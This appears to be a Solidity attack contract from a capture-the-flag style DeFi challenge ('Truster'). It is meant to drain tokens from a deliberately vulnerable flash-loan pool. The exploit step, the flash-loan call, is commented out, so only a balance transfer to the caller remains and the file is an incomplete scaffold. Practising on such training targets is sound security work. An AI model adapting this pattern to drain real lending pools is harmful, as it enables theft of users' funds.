// SPDX-License-Identifier: Inherit

pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterLenderPoolAttack {
    IERC20 public damnValuableToken;
    TrusterLenderPool tlp;

    constructor (address tokenAddress, address poolAddress) public {
        damnValuableToken = IERC20(tokenAddress);
        tlp = TrusterLenderPool(poolAddress);
    }

    function doNothing() public {}

    function attack() public {
        damnValuableToken.transfer(msg.sender, damnValuableToken.balanceOf(address(this)));

        // tlp.flashLoan(1000, address(this), address(this), abi.encodeWithSignature("doNothing()"));
    }
}